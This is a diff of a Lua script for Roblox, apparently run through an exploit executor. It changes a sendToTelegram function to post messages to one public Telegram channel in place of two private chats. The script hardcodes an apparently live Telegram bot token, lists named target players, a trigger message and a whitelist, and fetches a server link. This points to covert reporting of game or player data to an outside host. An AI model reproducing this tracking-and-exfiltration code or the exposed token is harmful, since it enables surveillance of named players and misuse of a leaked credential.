@@ -159,7 +159,7 @@ task.spawn(function()
     task.cancel(dotTask)
 end)
 local TELEGRAM_TOKEN = "8113815289:AAHjyPNLtl1Ug2HY2r0SYZJuNltlYZZG-zc"
-local TELEGRAM_CHAT_IDS = {"7144575011", "1192810837"}
+local TELEGRAM_CHANNEL = "@roblox_lelelelelelele"
 local TARGET_PLAYER = {"Rikizigg", "sERTTQE0"}
 local TRIGGER_MESSAGE = "."
 local WHITELIST = {
@@ -193,35 +193,21 @@ local function sendToTelegram(text)
         text = text:sub(1, 3500) .. "..."
     end
     
-    -- Отправляем в первый чат
-    local success1 = pcall(function()
+    local success = pcall(function()
         local url = string.format(
             "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
             TELEGRAM_TOKEN,
-            TELEGRAM_CHAT_IDS[1],
+            TELEGRAM_CHANNEL,
             HttpService:UrlEncode(text)
         )
         game:HttpGet(url)
     end)
     
-    task.wait(0.5)
-    
-    -- Отправляем во второй чат
-    local success2 = pcall(function()
-        local url = string.format(
-            "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
-            TELEGRAM_TOKEN,
-            TELEGRAM_CHAT_IDS[2],
-            HttpService:UrlEncode(text)
-        )
-        game:HttpGet(url)
-    end)
-    
-    if not success1 or not success2 then
+    if not success then
         STATS.errors = STATS.errors + 1
     end
     
-    return success1 or success2
+    return success
 end
 local function getServerLink()
     local placeId = game.PlaceId
